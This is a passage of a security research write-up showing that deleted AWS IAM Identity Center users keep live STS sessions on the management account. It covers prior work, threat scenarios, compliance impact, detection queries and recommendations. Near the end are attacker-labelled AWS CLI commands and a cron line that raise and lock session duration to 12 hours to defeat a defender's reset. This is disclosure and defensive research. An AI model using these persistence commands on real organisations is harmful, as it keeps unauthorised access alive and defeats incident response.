  eventName IN ('CreateToken', 'GetRoleCredentials')
  AND eventSource = 'sso.amazonaws.com'
ORDER BY eventTime DESC;
```

If you see `GetRoleCredentials` for a user you deleted, the zombie is actively refreshing. The `sourceIPAddress` and `userAgent` fields will identify the machine.

***

### Existing Research (What's Already Published)

| Source                               | Finding                                                                        | URL                                                                                                           |
| ------------------------------------ | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------- |
| Christophe Tafani-Dereeper (Datadog) | Disabling user does not invalidate access tokens                               | https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/             |
| Chaim Sanders                        | IdC access token has non-configurable 8hr lifetime, total exposure up to 20hrs | https://blog.devgenius.io/the-confusing-lifetimes-aws-iam-identity-center-access-tokens-bbd57d1eab40          |
| Red Canary                           | Cached SSO tokens survive offboarding, refresh tokens valid 90 days            | https://redcanary.com/blog/threat-detection/aws-sso-access-tokens/                                            |
| AWS Security Blog                    | Recommends inline deny workaround (blocked on management account)              | https://aws.amazon.com/blogs/security/how-to-revoke-federated-users-active-aws-sessions/                      |
| Aidan Steele                         | OIDC JWT token replay vulnerability (patched Dec 2023)                         | https://awsteele.com/blog/2023/12/19/an-aws-iam-identity-center-vulnerability.html                            |
| Datadog Security Labs                | Attacker modified IdC MFA config and session duration for persistence          | https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-the-attacker-doth-persist-too-much/ |

***

### What's New in This Research

All existing research documents STS persistence after **disabling** a user, and demonstrates fixes that work on **member accounts**. This research adds:

1. **Deletion does not revoke** a `ResourceNotFoundException` confirmed-deleted user retains a valid active STS session
2. **All mitigations fail simultaneously** on the management account this specific combination is undocumented
3. **The IR playbook is wrong** every standard incident response step fails silently without telling the responder it failed
4. **Deletion breaks refresh token exchange; disabling does not** deletion is more effective than disabling for breaking token refresh, capping the zombie window at the session duration
5. **Resource-based explicit deny is the only real-time partial mitigation** confirmed via S3 bucket policy test; must be applied per resource with no account-wide equivalent
6. **Sanders noted reserved roles are not manageable** in 2022 but did not follow the implication to its conclusion this research proves what that means during an active incident

#### How this extends existing research

| Sanders (2022)                 | Red Canary (2024)                     | This Research                                    |
| ------------------------------ | ------------------------------------- | ------------------------------------------------ |
| 20hr window via token stacking | Refresh token theft (disabled user)   | Confirmed zombie on **deleted** user             |
| Member account assumed         | Token theft / member account scenario | Management account no kill switch at all         |
| Math-based finding             | Attacker technique                    | IR failure defender did everything right         |
|                                | Disabled user scenario                | Deletion breaks refresh loop; disabling does not |
|                                |                                       | Only mitigation: per-resource explicit deny      |

***

### Architectural Root Cause

AWS designed the management account as a trust anchor. To prevent customers from accidentally locking themselves out, AWS:

* Exempted it from SCPs permanently
* Made `AWSReservedSSO_*` roles immutable

The side effect: the management account is also immune to incident response controls.

AWS's guidance says "don't put human SSO access on the management account." Their default setup wizard provisions SSO on the management account. The gap between their guidance and their defaults is where this vulnerability lives.

***

### Threat Model Why Businesses Should Care

#### Who Is Affected

Any organization that:

* Uses AWS IAM Identity Center (formerly AWS SSO)
* Has human users assigned AdministratorAccess on the management account
* Follows the AWS default setup wizard (which provisions SSO on the management account)

This is the default configuration for the majority of AWS organizations. AWS's own setup wizard creates this exposure. The customer does not have to misconfigure anything.

***

#### Threat Actors

| Actor                     | Scenario                                                                                                                               | Likelihood |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| Disgruntled employee      | Knows they are being terminated. Establishes CLI session morning of last day. IT offboards them correctly. Session persists.           | High       |
| Compromised credentials   | Attacker phishes SSO credentials or steals a laptop. Establishes CLI session. Defender detects and deletes the user. Session persists. | High       |
| Insider threat            | Legitimate user intentionally maintains access after offboarding by keeping CLI credentials alive.                                     | Medium     |
| Supply chain / contractor | Third-party contractor account is deleted after engagement ends. Session window still open.                                            | Medium     |

***

#### Blast Radius: Management Account vs Member Account

The management account is not just another AWS account. It is the trust anchor for the entire organization.

| Action possible during zombie window                            | Impact                                                                |
| --------------------------------------------------------------- | --------------------------------------------------------------------- |
| Remove SCPs from all child accounts                             | Every guardrail in the org disappears                                 |
| Access every member account via `OrganizationAccountAccessRole` | Full access to every account in the org production, security, billing |
| Disable GuardDuty org-wide                                      | Security monitoring gone across all accounts                          |
| Disable CloudTrail org-wide                                     | No audit trail attacker operates blind                                |
| Create IAM users/roles with no guardrails                       | Permanent backdoors in management account                             |
| Modify billing and account contacts                             | Account recovery options under attacker control                       |
| Delete SCPs protecting sensitive workloads                      | PCI, HIPAA, SOC2 controls removed silently                            |

A zombie session on a member account is a single-account breach. A zombie session on the management account is an organization-wide breach.

***

#### Why the IR Playbook Failure Is the Real Risk

The most dangerous aspect is not the session persistence it is that every remediation step **completes without error** while doing nothing.

* `delete-user` returns success → user is gone, session is alive
* `create-policy` + `attach-policy` return success → SCP is attached, management account ignores it
* `put-role-policy` returns `UnmodifiableEntity` → this one at least errors, but most teams don't know why

A security team that follows the documented AWS IR playbook will reach the end of their checklist believing the incident is contained. It is not. There is no system alert, no CloudTrail warning, no AWS notification that the session is still alive.

**The defender is failed by the tooling they were told to trust.**

***

#### Compliance and Regulatory Implications

| Framework | Requirement at risk                                                        |
| --------- | -------------------------------------------------------------------------- |
| SOC 2     | CC6.1 Logical access controls; CC7.3 Incident response                     |
| ISO 27001 | A.9.2.6 Removal of access rights                                           |
| PCI DSS   | Requirement 7 Restrict access; Requirement 12.10 Incident response plan    |
| HIPAA     | §164.312(a)(1) Access control; §164.308(a)(6) Security incident procedures |
| NIST CSF  | PR.AC-1 Identities managed; RS.MI-1 Incidents contained                    |

In each framework, the expectation is that deleting a user removes their access. On the AWS management account, that expectation is false.

***

#### Business Impact Scenarios

**Scenario 1 Terminated employee (most likely)** Employee is let go. IT follows standard offboarding IdC user deleted, access revoked. Employee had a CLI session running. They have up to 1 hour (the configured session duration max 12 hours). In that window they can exfiltrate customer data, destroy backups, or plant a backdoor. The business believes access was revoked at T+15 minutes. It wasn't.

**Scenario 2 Compromised credentials during active incident** Attacker gains SSO credentials via phishing. Security team detects anomalous activity, executes IR playbook, deletes the user. Attacker's session survives. Security team closes the incident. Attacker uses remaining session time to establish permanent foothold. The breach continues after the incident is marked resolved.

**Scenario 3 Deliberate persistence (most dangerous)** An attacker who is aware of this behavior uses it as an intentional IR evasion technique. After gaining initial access to the management account, they establish a CLI session and then deliberately allow themselves to be discovered. They may even trigger alerts to draw the security team in. The security team executes the full IR playbook disables the user, ends sessions, deletes the account, attaches the SCP. The team marks the incident contained.

The attacker was counting on this. Their STS session is still alive. They use the remaining window to create a permanent IAM backdoor an operation that takes under 60 seconds. The IdC user is gone, the investigation is closed, and the attacker has permanent unrevokable access with no active session to detect.

**The deletion becomes the attacker's cover story.** The IR team's own remediation actions create the false confidence that ends the investigation prematurely.

**Scenario 4 Audit failure** Auditor asks: "Can you demonstrate that access is revoked immediately upon user deletion?" The answer on the management account is no and there is no compensating control available to the customer. This is an audit finding with no remediation path short of architectural change.

***

| Recommendation                                                                          | Why                                                                                 |
| --------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| Move all human SSO access off the management account                                    | Eliminates the SCP exemption problem                                                |
| Use a dedicated security/audit member account for org-level access                      | SCPs apply, role is modifiable                                                      |
| Set minimum session duration (1 hour or less)                                           | Minimizes the zombie window confirmed to be the only time-based control that works  |
| Alert on `AssumeRoleWithWebIdentity` for `AWSReservedSSO_*` roles                       | Detect token issuance in real time                                                  |
| Alert on API calls from deleted IdC users via CloudTrail                                | Detect zombie sessions actively                                                     |
| Apply explicit deny resource policies (S3, KMS, Secrets Manager) on sensitive resources | Only real-time partial mitigation confirmed to work blocks zombie at resource level |
| Maximize session duration awareness attacker can extend to 12 hours before offboarding  | An attacker with access can run the command below to double their zombie window     |

**An attacker extending the session duration before offboarding:**

> **Scope clarification:** `update-permission-set` changes the session duration for _future_ sessions issued after the next portal login it does **not** extend the already-issued STS token currently in use. The current zombie STS token retains whatever duration was set when it was originally issued. The value of this technique is pre-offboarding: if the attacker runs this _before_ they are removed, the next session they establish (e.g., via a second machine or after re-authentication) will have a 12-hour window. The cron attack below is relevant when the attacker has a way to re-establish sessions for a pure zombie STS token, the window is fixed at issuance. _Empirical confirmation of this distinction pending._

```bash
# Run AS THE ATTACKER (zombie-test profile) not as admin
# Attacker has AdministratorAccess so can modify the permission set directly
aws sso-admin update-permission-set \
  --instance-arn arn:aws:sso:::instance/ssoins-72232524f5d640bc \
  --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72232524f5d640bc/ps-72236b21c2cce8a5 \
  --session-duration PT12H \
  --profile zombie-test

# Confirm it took effect
aws sso-admin describe-permission-set \
  --instance-arn arn:aws:sso:::instance/ssoins-72232524f5d640bc \
  --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72232524f5d640bc/ps-72236b21c2cce8a5 \
  --profile zombie-test \
  --query 'PermissionSet.SessionDuration'
# Returns: PT12H future sessions from this permission set will get 12-hour tokens
```

**Attacker maintain 12-hour window via cron (applies to disabled users with active refresh tokens):**

```bash
# extend-session.sh run every 5 minutes via cron
# Relevant when the attacker can refresh tokens (disabled user, not deleted)
# Even if the defender resets session duration to 1 hour, this flips it back
*/5 * * * * AWS_PROFILE=zombie-test aws sso-admin update-permission-set \
  --instance-arn arn:aws:sso:::instance/ssoins-72232524f5d640bc \
  --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72232524f5d640bc/ps-72236b21c2cce8a5 \
  --session-duration PT12H
```

The defender has no way to win this race while the zombie session is alive every reset is immediately reversed. The only way to stop it is to stop the session, which is impossible for deleted users. This turns the session duration control into a useless knob during an active incident on the management account.

**Defender verify and lock session duration to minimum:**

```bash
# Check current session duration
aws sso-admin describe-permission-set \
  --instance-arn $INSTANCE_ARN \
  --permission-set-arn $PERMISSION_SET_ARN \
  --profile $ADMIN_PROFILE \
  --query 'PermissionSet.SessionDuration'

# Reset to minimum (1 hour)
aws sso-admin update-permission-set \
  --instance-arn $INSTANCE_ARN \
  --permission-set-arn $PERMISSION_SET_ARN \
  --session-duration PT1H \
  --profile $ADMIN_PROFILE
```
